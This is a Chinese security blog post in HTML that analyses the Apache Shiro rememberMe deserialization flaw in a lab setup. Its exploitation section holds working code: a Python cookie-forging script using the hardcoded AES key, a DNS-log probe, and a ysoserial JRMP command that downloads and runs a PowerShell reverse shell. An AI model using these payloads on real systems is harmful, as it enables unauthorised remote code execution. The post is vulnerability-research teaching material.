@@ -1,0 +1,921 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon.ico?v=5.1.3">
+
+
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="Apache Shiro 反序列化漏洞分析">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Apache Shiro 反序列化之殇">
+<meta property="og:url" content="http://www.lxhsec.com/2020/07/13/shiroRememberMeSerialized/index.html">
+<meta property="og:site_name" content="lyxhh">
+<meta property="og:description" content="Apache Shiro 反序列化漏洞分析">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://www.lxhsec.com/2020/07/13/shiroRememberMeSerialized/error-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/07/13/shiroRememberMeSerialized/env-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/07/13/shiroRememberMeSerialized/env-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/07/13/shiroRememberMeSerialized/env-03.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/07/13/shiroRememberMeSerialized/env-04.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/07/13/shiroRememberMeSerialized/env-05.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/07/13/shiroRememberMeSerialized/env-06.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/07/13/shiroRememberMeSerialized/pre-parse-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/07/13/shiroRememberMeSerialized/pre-parse-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/07/13/shiroRememberMeSerialized/pre-parse-03.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/07/13/shiroRememberMeSerialized/pre-parse-04.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/07/13/shiroRememberMeSerialized/parse-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/07/13/shiroRememberMeSerialized/parse-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/07/13/shiroRememberMeSerialized/parse-03.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/07/13/shiroRememberMeSerialized/parse-04.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/07/13/shiroRememberMeSerialized/parse-05.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/07/13/shiroRememberMeSerialized/parse-06.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/07/13/shiroRememberMeSerialized/parse-07.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/07/13/shiroRememberMeSerialized/parse-08.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/07/13/shiroRememberMeSerialized/parse-09.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/07/13/shiroRememberMeSerialized/parse-e-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/07/13/shiroRememberMeSerialized/parse-e-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/07/13/shiroRememberMeSerialized/parse-e-03.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/07/13/shiroRememberMeSerialized/parse-10.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/07/13/shiroRememberMeSerialized/parse-d-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/07/13/shiroRememberMeSerialized/parse-d-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/07/13/shiroRememberMeSerialized/parse-d-03.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/07/13/shiroRememberMeSerialized/parse-d-04.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/07/13/shiroRememberMeSerialized/parse-exp-01.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/07/13/shiroRememberMeSerialized/parse-exp-02.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/07/13/shiroRememberMeSerialized/parse-exp-03.png">
+<meta property="og:image" content="http://www.lxhsec.com/2020/07/13/shiroRememberMeSerialized/parse-exp-04.png">
+<meta property="og:updated_time" content="2020-12-21T01:13:23.114Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Apache Shiro 反序列化之殇">
+<meta name="twitter:description" content="Apache Shiro 反序列化漏洞分析">
+<meta name="twitter:image" content="http://www.lxhsec.com/2020/07/13/shiroRememberMeSerialized/error-01.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.lxhsec.com/2020/07/13/shiroRememberMeSerialized/"/>
+
+
+
+
+
+  <title>Apache Shiro 反序列化之殇 | lyxhh</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">lyxhh</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.lxhsec.com/2020/07/13/shiroRememberMeSerialized/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="lyxhh">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/1.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lyxhh">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Apache Shiro 反序列化之殇</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-07-13T17:02:19+08:00">
+                2020-07-13
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2020-12-21T09:13:23+08:00">
+                2020-12-21
+              </time>
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>Apache Shiro 反序列化漏洞分析<a id="more"></a></p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Shiro RememberMe RCE是护网常见的漏洞，因RememberMe值加密的原因，自带绕waf特性，安服仔使用起来极其舒适，之前也看过一些大佬们写的漏洞分析，看完之后一堆疑问，安服仔决定当一次研究仔去调试一次，解决一些我的疑问，并记录。</p>
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Apache Shiro是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。</p>
+<p>Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>Java: jdk1.8.0_121<br>Tomcat: 7.0.94</p>
+<p><a href="https://github.com/apache/shiro/tree/shiro-root-1.2.4" target="_blank" rel="external">download Shiro 1.2.24</a></p>
+<p>解压后进入shiro-shiro-root-1.2.4/samples/web</p>
+<p>用IDEA加载，并设置pom.xml，指定jstl版本为1.2，增加commons-collections4，如下：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">  <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></div><div class="line">			<span class="comment">&lt;!--  这里需要将jstl设置为1.2 --&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></div><div class="line">.....</div><div class="line"></div><div class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>如果不指定jstl版本<code>&lt;version&gt;1.2&lt;/version&gt;</code>，会报错误<code>The absolute uri: http://java.sun.com/jsp/jstl/core cannot be resolved in either web.xml or the jar files deployed with this application</code>，如下：</p>
+<p><img src="/2020/07/13/shiroRememberMeSerialized/error-01.png" alt="error-01"></p>
+<p>增加commons-collections4，是为了后面反序列化起来如喝水一般流畅。</p>
+<p>接着设置run/debug configurations， 添加本地tomcat环境</p>
+<p><img src="/2020/07/13/shiroRememberMeSerialized/env-01.png" alt="env-01"></p>
+<p>部署war包：</p>
+<p><img src="/2020/07/13/shiroRememberMeSerialized/env-02.png" alt="env-02"></p>
+<p>设置项目路径：<br><img src="/2020/07/13/shiroRememberMeSerialized/env-03.png" alt="env-03"></p>
+<p>然后Run 起来，访问<code>http://192.168.43.30:8000/shirotest/</code>，出现下图就证明环境是没问题。</p>
+<p><img src="/2020/07/13/shiroRememberMeSerialized/env-04.png" alt="env-04"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>登陆时勾选<code>Remember Me</code>，</p>
+<p><img src="/2020/07/13/shiroRememberMeSerialized/env-05.png" alt="env-05"></p>
+<p>Cookie中会多一个<code>rememberMe</code>key,</p>
+<p><img src="/2020/07/13/shiroRememberMeSerialized/env-06.png" alt="env-06"></p>
+<p>而漏洞就是出现在<code>rememberMe</code>key中。</p>
+<p>我们先来看下<a href="https://issues.apache.org/jira/browse/SHIRO-550" target="_blank" rel="external">漏洞描述</a>：<br><img src="/2020/07/13/shiroRememberMeSerialized/pre-parse-01.png" alt="pre-parse-01"></p>
+<p>问题出现在CookieRememberMeManager，这里我们将shiro的源码都下载下来（IDEA中点开Maven下的shiro包会提示Download Sources，点击即可下载），然后全局搜索下CookieRememberMeManager，如下:</p>
+<p><img src="/2020/07/13/shiroRememberMeSerialized/pre-parse-02.png" alt="pre-parse-02"></p>
+<p>Notice: <code>一定要下载shiro源码才能搜索到，IDEA目前还没有智能到可以直接重构 已编译文件 的索引</code>。</p>
+<p>点进<code>CookieRememberMeManager</code>，打开IDEA的Structure选项卡，可以清晰的看出<code>CookieRememberMeManager</code>类的组成元素，根据名称与对应的代码，可以大概知道他们各自的功能。</p>
+<p>然后这里我们先分析rememberMe是怎么加密的，我们通过IDEA的Find Usage功能对rememberSerializedIdentity函数进行往上查找，发现其被<code>rememberIdentity</code>调用了，</p>
+<p><img src="/2020/07/13/shiroRememberMeSerialized/pre-parse-03.png" alt="pre-parse-03"></p>
+<p>接着再往上查找2层，找到了程序登陆成功的流程，如下：</p>
+<p><img src="/2020/07/13/shiroRememberMeSerialized/pre-parse-04.png" alt="pre-parse-04"></p>
+<p>我们在程序登陆成功处打个断点<code>org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin</code>，先来分析<code>rememberMe</code>值的加密过程，然后浏览器进行登陆账户<code>root/secret</code>，勾选上<code>Remember Me</code>的按钮，进行登陆，此时程序会停在断点处，如下：</p>
+<p><img src="/2020/07/13/shiroRememberMeSerialized/parse-01.png" alt="parse-01"></p>
+<p>在onSuccessfulLogin方法中，首先调用forgetIdentity方法来进行处理request和response请求，并在response中设置<code>rememberMe=deleteMe</code>的 Cookie，</p>
+<p>在数据包中显示如下：<br><code>Set-Cookie: rememberMe=deleteMe; Path=/shirotest; Max-Age=0; Expires=Mon, 13-Jul-2020 07:41:20 GMT</code></p>
+<p>这个不是关键 大家有兴趣可以自己跟一下。</p>
+<p>然后判断有没有勾选<code>Remember Me</code>选项，这里我登陆时勾选了，因此isRememberMe(token)结果为true，F5进入<code>rememberIdentity(Subject subject, AuthenticationToken token, AuthenticationInfo authcInfo)</code>函数。</p>
+<p><img src="/2020/07/13/shiroRememberMeSerialized/parse-02.png" alt="parse-02"></p>
+<p>该函数首先调用getIdentityToRemember函数来获取用户身份，</p>
+<p>接着我们先跟进<br><code>rememberIdentity(org.apache.shiro.subject.Subject, org.apache.shiro.subject.PrincipalCollection)</code>函数</p>
+<p><img src="/2020/07/13/shiroRememberMeSerialized/parse-03.png" alt="parse-03"></p>
+<p>该函数首先调用了convertPrincipalsToBytes，F5跟进去，</p>
+<p><img src="/2020/07/13/shiroRememberMeSerialized/parse-04.png" alt="parse-04"></p>
+<p>convertPrincipalsToBytes函数 首先对用户身份<code>&quot;root&quot;</code>进行了序列化，然后对序列化后的字节数组进行了加密，我们F5跟进<code>org.apache.shiro.mgt.AbstractRememberMeManager#encrypt(byte[] serialized)</code>函数，看下是怎么加密的。</p>
+<p><img src="/2020/07/13/shiroRememberMeSerialized/parse-05.png" alt="parse-05"></p>
+<p>根据IDEA调试的变量信息，可以推测加密算法为AES，模式为CBC，填充为PKCS5Padding，getEncryptionCipherKey()函数应该是获取AES加密的密钥，这里我们跟进去，如下</p>
+<p><img src="/2020/07/13/shiroRememberMeSerialized/parse-06.png" alt="parse-06"></p>
+<p>是一个get方法，我们找下对应的set方法，Find Usages找下哪里调用了setEncryptionCipherKey方法，最后找到是setCipherKey方法调用了。<br><img src="/2020/07/13/shiroRememberMeSerialized/parse-07.png" alt="parse-07"></p>
+<p>继续往上找<br><img src="/2020/07/13/shiroRememberMeSerialized/parse-08.png" alt="parse-08"></p>
+<p>找到了AES的Key，以硬编码的方式写在代码里，<br><img src="/2020/07/13/shiroRememberMeSerialized/parse-09.png" alt="parse-09"></p>
+<p>继续跟进<code>encrypt(serialized, getEncryptionCipherKey())</code><br><img src="/2020/07/13/shiroRememberMeSerialized/parse-e-01.png" alt="parse-e-01"></p>
+<p>iv通过generateInitializationVector函数生成，</p>
+<p><img src="/2020/07/13/shiroRememberMeSerialized/parse-e-02.png" alt="parse-e-02"></p>
+<p>跟进generateInitializationVector函数，可以发现iv是随机生成的。</p>
+<p>iv随机生成的，那它解密的时候如何获取这个iv呢？</p>
+<p>接下来</p>
+<p>回到<code>encrypt(serialized, getEncryptionCipherKey())</code>，</p>
+<p>跟进 <code>encrypt(byte[] plaintext, byte[] key, byte[] iv, boolean prependIv)</code></p>
+<p><img src="/2020/07/13/shiroRememberMeSerialized/parse-e-03.png" alt="parse-e-03"></p>
+<p>最终加密返回来的bytes，是由16位iv+密文组成的。</p>
+<p>目前上面分析到的整个加密过程：</p>
+<p>将<code>root</code>身份序列化之后的值经过AES加密，加密过后的值与16位iv进行拼接，返回新的bytes数组，其中16位iv在新字节数组的头部，即<code>iv=bytes[:16],encrypt=bytes[16:]</code></p>
+<ul>
+<li>加密算法为AES，模式为CBC，填充为PKCS5Padding，</li>
+<li>key为<code>Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;)</code></li>
+<li>iv随机生成的16位。</li>
+</ul>
+<p>以上就是convertPrincipalsToBytes函数做的事情</p>
+<p>然后F7跳出convertPrincipalsToBytes函数，回到最开始的rememberIdentity函数，跟进rememberSerializedIdentity函数，<br><img src="/2020/07/13/shiroRememberMeSerialized/parse-10.png" alt="parse-10"></p>
+<p>rememberSerializedIdentity函数将AES加密后的值Base64编码了一次，然后设置到Cookie中。</p>
+<p>梳理下Cookie中rememberMe值的由来：</p>
+<p>1.序列化用户身份root<br>2.将序列化后的值进行AES加密，密钥为常量，IV为随机数<br>3.将AES加密后的值与iv拼接，进行Base64编码<br>4.设置到Cookie中的rememberMe字段。</p>
+<p>之前看大佬文章说啥iv没有使用，当时安服仔有点懵，AES，CBC模式，iv不能为空把，为空还叫CBC吗，分析到这里 可以得知iv使用了，然后将iv跟AES加密的值进行了拼接，在进行的base64编码，这样组装让shiro解码完成后取前16个字节组成iv，从而完成AES的解密。</p>
+<p>接下来我们看下rememberMe字段的解密过程：</p>
+<p>在跟踪加密过程的时有<code>org.apache.shiro.mgt.AbstractRememberMeManager#encrypt(byte[] serialized)</code>这个函数，我们在这个类<code>org.apache.shiro.mgt.AbstractRememberMeManager</code>中找到对应的<code>decrypt(byte[] encrypted)</code>函数，然后Find Usages，往上找二层，找到<code>org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals</code> 然后下断点，如下：</p>
+<p><img src="/2020/07/13/shiroRememberMeSerialized/parse-d-01.png" alt="parse-d-01"></p>
+<p>接着在登陆状态下请求网站，让断点停下。</p>
+<p>跟进getRememberedSerializedIdentity函数</p>
+<p><img src="/2020/07/13/shiroRememberMeSerialized/parse-d-02.png" alt="parse-d-02"></p>
+<p><code>org.apache.shiro.web.mgt.CookieRememberMeManager#getRememberedSerializedIdentity</code>函数做了两件事，先是取了Cookie中的rememberMe值，然后将其进行Base64解码。</p>
+<p>F7回到getRememberedPrincipals函数，跟进convertBytesToPrincipals函数。</p>
+<p><img src="/2020/07/13/shiroRememberMeSerialized/parse-d-03.png" alt="parse-d-03"></p>
+<p>对解码后的值进行解密，然后进行反序列化，跟进deserialize，就可以看到readObject()方法。<br><img src="/2020/07/13/shiroRememberMeSerialized/parse-d-04.png" alt="parse-d-04"></p>
+<p>这里就不对decrypt函数进行跟踪了，有兴趣可以自己跟一下（加密已经很清晰了，解密的时候反着来就完事了）。</p>
+<p>梳理下Cookie中rememberMe值的解密过程：</p>
+<p>1.读取Cookie中的rememberMe字段值，然后进行Base64编码<br>2.AES解密<br>3.进行反序列化</p>
+<p>整个解密过程，可以看到在进行反序列化之前没有任何过滤，导致外界传什么值，就反序列化什么。</p>
+<p>而AES硬编码的缘故，使得我们可以构造任意的rememberMe字段值，从而导致 任意代码执行。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>这里我们分两种情况，漏洞机器能出网的检测，以及漏洞机器不能出网的检测。</p>
+<h3 id="机器能出网情况"><a href="#机器能出网情况" class="headerlink" title="机器能出网情况"></a>机器能出网情况</h3><h4 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h4><p>直接使用ysoserial的URLDNS模块，进行检测，代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># coding:utf-8</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</div><div class="line"><span class="keyword">import</span> traceback</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> subprocess</div><div class="line"><span class="keyword">import</span> uuid</div><div class="line"><span class="keyword">import</span> base64</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line">target = <span class="string">"http://192.168.43.30:8000/shirotest/"</span></div><div class="line">jar_file = <span class="string">'./ysoserial-0.0.6-SNAPSHOT-all.jar'</span></div><div class="line">cipher_key = <span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span></div><div class="line"></div><div class="line"><span class="comment"># 创建 rememberme的值</span></div><div class="line">popen = subprocess.Popen([<span class="string">'java'</span>,<span class="string">'-jar'</span>,jar_file, <span class="string">"URLDNS"</span>, <span class="string">"http://5atsqm.dnslog.cn"</span>],</div><div class="line">                        stdout=subprocess.PIPE)</div><div class="line">BS = AES.block_size</div><div class="line">pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</div><div class="line">mode = AES.MODE_CBC</div><div class="line">iv = uuid.uuid4().bytes</div><div class="line">encryptor = AES.new(base64.b64decode(cipher_key), mode, iv)</div><div class="line">file_body = pad(popen.stdout.read())</div><div class="line">base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</div><div class="line"></div><div class="line"><span class="comment"># 发送request</span></div><div class="line"><span class="keyword">try</span>:</div><div class="line">    r = requests.get(target, cookies=&#123;<span class="string">'rememberMe'</span>:base64_ciphertext.decode()&#125;, timeout=<span class="number">30</span>)</div><div class="line">    print(r.status_code)</div><div class="line"><span class="keyword">except</span>:</div><div class="line">    traceback.print_exc()</div></pre></td></tr></table></figure></p>
+<p>执行之后，DNSLOG有记录，大概率存在此漏洞，如下，</p>
+<p><img src="/2020/07/13/shiroRememberMeSerialized/parse-exp-01.png" alt="parse-exp-01"></p>
+<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><h5 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h5><p>1.攻击主机<code>192.168.43.31</code> 运行JRMP：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 7778 CommonsCollections4 <span class="string">"powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [nc所在ip] -port 7777"</span></div></pre></td></tr></table></figure></p>
+<p>2.攻击主机nc监听：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nc -lvp 7777</div></pre></td></tr></table></figure></p>
+<p>3.做完以上操作，就可以执行poc了：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># coding:utf-8</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</div><div class="line"><span class="keyword">import</span> traceback</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> subprocess</div><div class="line"><span class="keyword">import</span> uuid</div><div class="line"><span class="keyword">import</span> base64</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">target = <span class="string">"http://192.168.43.30:8000/shirotest/"</span></div><div class="line">jar_file = <span class="string">'./ysoserial-0.0.6-SNAPSHOT-all.jar'</span></div><div class="line">cipher_key = <span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(command)</span>:</span></div><div class="line">    <span class="comment"># 创建 rememberme的值</span></div><div class="line">    popen = subprocess.Popen([<span class="string">'java'</span>,<span class="string">'-jar'</span>,jar_file, <span class="string">"JRMPClient"</span>, command],</div><div class="line">                            stdout=subprocess.PIPE)</div><div class="line">    BS = AES.block_size</div><div class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</div><div class="line">    mode = AES.MODE_CBC</div><div class="line">    iv = uuid.uuid4().bytes</div><div class="line">    encryptor = AES.new(base64.b64decode(cipher_key), mode, iv)</div><div class="line">    file_body = pad(popen.stdout.read())</div><div class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</div><div class="line"></div><div class="line">    <span class="comment"># 发送request</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        r = requests.get(target, cookies=&#123;<span class="string">'rememberMe'</span>:base64_ciphertext.decode()&#125;, timeout=<span class="number">30</span>)</div><div class="line">        print(r.status_code)</div><div class="line">    <span class="keyword">except</span>:</div><div class="line">        traceback.print_exc()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="comment"># JRMP主机ip:监听端口</span></div><div class="line">    exp(<span class="string">"192.168.43.31:7778"</span>)</div></pre></td></tr></table></figure></p>
+<p>结果：<br><img src="/2020/07/13/shiroRememberMeSerialized/parse-exp-02.png" alt="parse-exp-02"></p>
